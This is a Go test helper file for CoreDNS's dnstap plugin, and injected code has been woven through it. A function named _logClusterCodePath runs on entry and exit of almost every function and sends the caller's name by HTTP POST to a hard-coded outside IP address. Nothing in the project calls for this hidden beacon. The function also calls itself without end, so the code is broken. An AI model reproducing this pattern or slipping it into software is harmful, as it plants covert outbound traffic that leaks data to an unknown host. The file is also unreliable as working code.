package test

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"net"
	"reflect"
	"github.com/coredns/coredns/plugin/dnstap/msg"
	tap "github.com/dnstap/golang-dnstap"
)

type Context struct {
	context.Context
	TrapTapper
}

func TestingData() (d *msg.Builder) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	d = &msg.Builder{SocketFam: tap.SocketFamily_INET, SocketProto: tap.SocketProtocol_UDP, Address: net.ParseIP("10.240.0.1"), Port: 40212}
	return
}

type comp struct {
	Type	*tap.Message_Type
	SF	*tap.SocketFamily
	SP	*tap.SocketProtocol
	QA	[]byte
	RA	[]byte
	QP	*uint32
	RP	*uint32
	QTSec	bool
	RTSec	bool
	RM	[]byte
	QM	[]byte
}

func toComp(m *tap.Message) comp {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return comp{Type: m.Type, SF: m.SocketFamily, SP: m.SocketProtocol, QA: m.QueryAddress, RA: m.ResponseAddress, QP: m.QueryPort, RP: m.ResponsePort, QTSec: m.QueryTimeSec != nil, RTSec: m.ResponseTimeSec != nil, RM: m.ResponseMessage, QM: m.QueryMessage}
}
func MsgEqual(a, b *tap.Message) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return reflect.DeepEqual(toComp(a), toComp(b))
}

type TrapTapper struct {
	Trap	[]*tap.Message
	Full	bool
}

func (t *TrapTapper) Pack() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return t.Full
}
func (t *TrapTapper) TapMessage(m *tap.Message) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	t.Trap = append(t.Trap, m)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
